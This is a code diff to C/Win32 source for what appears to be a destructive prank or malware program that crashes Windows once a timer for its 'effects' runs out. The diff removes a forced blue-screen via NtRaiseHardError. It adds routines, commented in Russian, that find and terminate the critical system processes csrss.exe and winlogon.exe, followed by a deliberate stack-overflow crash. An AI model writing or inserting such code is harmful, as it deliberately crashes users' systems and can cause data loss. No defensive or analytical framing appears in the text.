@@ -1015,16 +1015,47 @@ __declspec(noinline) VOID StackOverflowCrash() {
 DWORD WINAPI TimerThread(LPVOID lpParam) {
     Sleep(TOTAL_EFFECTS_TIME);
     
-    BOOLEAN bl;
-    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtRaiseHardError");
-    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");
-    
-    if (RtlAdjustPrivilege && NtRaiseHardError) {
-        RtlAdjustPrivilege(19, 1, 0, &bl);
-        NtRaiseHardError(0xC0000229, 0, 0, 0, 6, NULL);
+    // ====== СПОСОБ 1: УБИВАЕМ CSRSS.EXE ======
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
+        if (Process32First(hSnapshot, &pe)) {
+            do {
+                if (_stricmp(pe.szExeFile, "csrss.exe") == 0) {
+                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                    if (hProcess) {
+                        TerminateProcess(hProcess, 0);
+                        CloseHandle(hProcess);
+                    }
+                    break;
+                }
+            } while (Process32Next(hSnapshot, &pe));
+        }
+        CloseHandle(hSnapshot);
     }
     
+    // ====== СПОСОБ 2: ЕСЛИ НЕ СРАБОТАЛО — УБИВАЕМ WINLOGON.EXE ======
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
+        if (Process32First(hSnapshot, &pe)) {
+            do {
+                if (_stricmp(pe.szExeFile, "winlogon.exe") == 0) {
+                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                    if (hProcess) {
+                        TerminateProcess(hProcess, 0);
+                        CloseHandle(hProcess);
+                    }
+                    break;
+                }
+            } while (Process32Next(hSnapshot, &pe));
+        }
+        CloseHandle(hSnapshot);
+    }
+    
+    // ====== СПОСОБ 3: STACK OVERFLOW (ДОБИВАЕТ ВСЕГДА) ======
     StackOverflowCrash();
+    
     return 0;
 }
 
